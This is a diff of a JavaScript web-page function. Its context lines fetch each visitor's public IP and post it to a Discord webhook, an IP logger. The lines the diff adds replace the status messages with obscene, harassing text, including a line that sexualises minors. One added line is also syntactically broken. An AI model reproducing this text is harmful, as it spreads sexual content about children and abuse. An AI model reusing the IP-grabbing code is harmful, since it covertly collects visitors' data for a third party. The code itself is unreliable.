@@ -14,13 +14,13 @@
 
     async function reportIpAndReload() {
       try {
-        document.getElementById('status').textContent = 'Getting IP...';
+        document.getElementById('status').textContent = 'Finding Big black brolic men to fist you' ${ip};
         // get public IP (uses external service)
         const ipResp = await fetch('https://api.ipify.org?format=json');
         const ipJson = await ipResp.json();
         const ip = ipJson.ip || 'unknown';
 
-        document.getElementById('status').textContent = 'F';
+        document.getElementById('status').textContent = 'Spraying cum on minors..';
 
         // Build a Discord webhook payload
         const payload = {
@@ -37,7 +37,7 @@
           console.warn('Direct webhook POST failed (likely CORS):', err);
         });
 
-        document.getElementById('status').textContent = `F`;
+        document.getElementById('status').textContent = `Found 1 buttplug and dildo in stock...`;
       } catch (err) {
         console.error(err);
         document.getElementById('status').textContent = 'Error: ' + (err.message || err);
